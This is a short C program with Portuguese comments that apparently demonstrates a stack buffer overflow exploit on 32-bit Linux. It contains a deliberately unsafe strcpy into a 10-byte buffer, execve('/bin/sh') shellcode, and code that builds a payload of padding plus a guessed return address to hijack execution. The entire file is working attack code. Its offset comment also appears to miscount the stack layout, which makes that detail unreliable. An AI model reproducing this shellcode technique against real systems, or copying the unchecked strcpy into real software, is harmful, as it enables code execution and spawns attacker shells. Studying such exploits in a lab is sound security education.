#include <stdio.h>
#include <string.h>

void vul(char *dado) {
    char buffer[10];
    strcpy(buffer, dado);
}

int main() {
    // Shellcode que chama /bin/sh (para Linux x86)
    char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
    
    // Descobrir o endereço do buffer (no GDB)
    // Vamos usar um endereço aproximado (você vai descobrir)
    unsigned long endereco_shellcode = 0xbffff123;  // ESTE VALOR MUDA!
    
    char payload[100];
    int offset = 14;  // 10 buffer + 4 pro retorno (32 bits)
    
    // 1. Preenche com 'A' (padding)
    memset(payload, 'A', offset);
    
    // 2. Coloca o endereço do shellcode (em little-endian)
    // (endereco_shellcode) -> bytes
    payload[offset] = (endereco_shellcode >> 0) & 0xFF;
    payload[offset+1] = (endereco_shellcode >> 8) & 0xFF;
    payload[offset+2] = (endereco_shellcode >> 16) & 0xFF;
    payload[offset+3] = (endereco_shellcode >> 24) & 0xFF;
    
    // 3. Coloca o shellcode depois
    memcpy(payload + offset + 4, shellcode, sizeof(shellcode));
    
    // 4. Chama a função vulnerável
    vul(payload);
    
    return 0;
}
